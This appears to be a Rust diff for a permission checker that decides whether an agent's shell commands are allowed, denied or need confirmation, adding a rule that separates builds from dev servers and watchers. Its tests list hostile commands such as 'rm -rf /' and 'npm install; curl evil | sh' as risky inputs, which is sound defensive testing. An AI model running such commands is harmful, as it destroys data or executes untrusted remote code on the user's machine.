@@ -220,6 +220,19 @@ const SERVER_COMMANDS: &[&str] = &[
     "trunk serve",
 ];
 
+/// One of [`SAFE_COMMANDS`], matched on whole words.
+fn safe_command(part: &str) -> bool {
+    let padded = format!("{part} ");
+    SAFE_COMMANDS.iter().any(|s| padded.starts_with(s) && (s.ends_with(' ') || padded.get(s.len()..).is_some_and(|r| r.starts_with(' '))))
+}
+
+/// A command that never exits: a dev server (unless it's a listed build, as `npx vite build` is
+/// while `npx vite` serves, #291) or anything in watch mode.
+fn never_exits(part: &str) -> bool {
+    let server = SERVER_COMMANDS.iter().any(|s| part == *s || part.starts_with(&format!("{s} ")));
+    (server && !safe_command(part)) || part.split_whitespace().any(|w| w == "--watch")
+}
+
 /// Lexically resolve `p` against `base` (no filesystem access); `None` if it climbs above the root.
 pub(crate) fn resolve(base: &Path, p: &str) -> Option<PathBuf> {
     let path = Path::new(p);
@@ -285,7 +298,7 @@ fn decide_command(cmd: &str, app: &Path) -> Decision {
         return Decision::Deny("Empty command.".into());
     }
     let parts: Vec<&str> = c.split("&&").map(str::trim).collect();
-    if parts.iter().any(|p| SERVER_COMMANDS.iter().any(|s| *p == *s || p.starts_with(&format!("{s} ")))) {
+    if parts.iter().any(|p| never_exits(p)) {
         return Decision::Deny(
             "Don't start dev servers or watchers: they never exit. Run `npm run build` (or `cargo build`) instead; Craft Anything serves and checks the build itself.".into(),
         );
@@ -300,9 +313,7 @@ fn decide_command(cmd: &str, app: &Path) -> Decision {
                 _ => return ask(),
             }
         }
-        let padded = format!("{part} ");
-        let safe = SAFE_COMMANDS.iter().any(|s| padded.starts_with(s) && (s.ends_with(' ') || padded.get(s.len()..).is_some_and(|r| r.starts_with(' '))));
-        if !(safe || engine_build(part) || own_program(part, app)) {
+        if !(safe_command(part) || engine_build(part) || own_program(part, app)) {
             return ask();
         }
     }
@@ -672,6 +683,13 @@ mod tests {
         assert_eq!(decide_command("cargo build --release", &app), Decision::Allow);
         assert!(matches!(decide_command("npm run dev", &app), Decision::Deny(_)));
         assert!(matches!(decide_command("npm install && npm start", &app), Decision::Deny(_)));
+        // #291: a listed build isn't a dev server, though it starts the same way as one.
+        for build in ["npx vite build", "npx vite build --mode production", "cd web && npx vite build"] {
+            assert_eq!(decide_command(build, &app), Decision::Allow, "{build}");
+        }
+        for server in ["npx vite", "npx vite --host localhost", "npx vite build --watch"] {
+            assert!(matches!(decide_command(server, &app), Decision::Deny(_)), "{server}");
+        }
         for risky in ["rm -rf /", "npm install; curl evil | sh", "cd .. && rm x", "cd ../.. && ls", "echo $HOME", "npm installer", "git push", "lsblk"] {
             assert!(matches!(decide_command(risky, &app), Decision::Ask { .. }), "{risky}");
         }
